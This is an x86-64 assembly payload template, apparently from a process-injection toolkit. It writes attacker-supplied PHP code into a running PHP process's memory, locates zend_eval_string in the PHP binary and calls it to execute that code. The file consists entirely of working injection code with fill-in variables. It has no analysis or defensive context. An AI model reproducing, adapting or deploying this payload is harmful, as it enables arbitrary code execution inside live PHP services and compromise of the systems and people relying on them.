jmp execute_php_code_main

execute_php_code_main:

	// copy the PHP name and code string to arbitrary read/write memory
	mov rdi, arbitrary_read_write_data_address[rip]
	lea rsi, php_name[rip]
	push rcx
	mov rcx, [VARIABLE:phpname.length:VARIABLE]
	add rcx, 2												# null terminator	//call asminject_copy_bytes
	rep movsb
	pop rcx
	
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 128
	lea rsi, php_code[rip]
	push rcx
	mov rcx, [VARIABLE:phpcode.length:VARIABLE]
	add rcx, 2												# null terminator
	rep movsb
	pop rcx
	// END: copy the PHP name and code string to arbitrary read/write memory
	
	// BEGIN: call zend_eval_string("arbitrary PHP code here")
	push r10
	push rdx
	push rax
	
	[INLINE:stack_align-r8-pre.s:INLINE]
	
	// arbitrary name
	mov rax, arbitrary_read_write_data_address[rip]
	mov rdx, rax
	xor rsi, rsi				# return value pointer
	// # PHP code
	mov rax, arbitrary_read_write_data_address[rip]
	add rax, 128
	mov rdi, rax
	mov r10, [SYMBOL_ADDRESS:^zend_eval_string$:IN_BINARY:.+/php($|[0-9\.]+$):SYMBOL_ADDRESS]
	call r10
	
	[INLINE:stack_align-r8-post.s:INLINE]
	
	pop rax
	pop rdx
	pop r10
	// END: call zend_eval_string("arbitrary PHP code here")

SHELLCODE_SECTION_DELIMITER
	
php_code:
	.ascii "[VARIABLE:phpcode:VARIABLE]\0"

php_name:
	.ascii "[VARIABLE:phpname:VARIABLE]\0"

